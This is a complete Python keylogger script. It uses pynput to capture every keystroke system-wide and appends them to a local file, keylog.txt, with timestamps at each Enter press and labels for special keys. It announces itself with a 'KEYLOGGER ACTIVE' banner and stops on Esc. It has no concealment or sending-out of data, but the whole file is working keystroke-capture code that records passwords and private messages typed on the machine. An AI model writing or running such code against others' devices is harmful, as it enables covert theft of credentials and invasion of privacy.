import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

log_file = "keylog.txt"

def write_to_file(key):
    """
    This function processes the key and appends it to the text file.
    """
    with open(log_file, "a") as f:
        k = str(key).replace("'", "")
        
        if k == 'Key.enter':
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n[{timestamp}] : ")
            
        elif k == 'Key.space':
            f.write(' ')
            
        elif k == 'Key.backspace':
            f.write('[BACK]')
            
        elif 'Key' in k:
            # This handles special keys like Shift, Ctrl, etc.
            f.write(f' [{k.split(".")[1].upper()}] ')
            
        else:
            f.write(k)

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == Key.esc:
        print("\n[!] Stopping keylogger... Logs saved to " + log_file)
        return False

print("==========================================")
print("[+] KEYLOGGER ACTIVE")
print(f"[+] Logging to: {log_file}")
print("[+] Press 'ESC' to stop and exit.")
print("==========================================")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
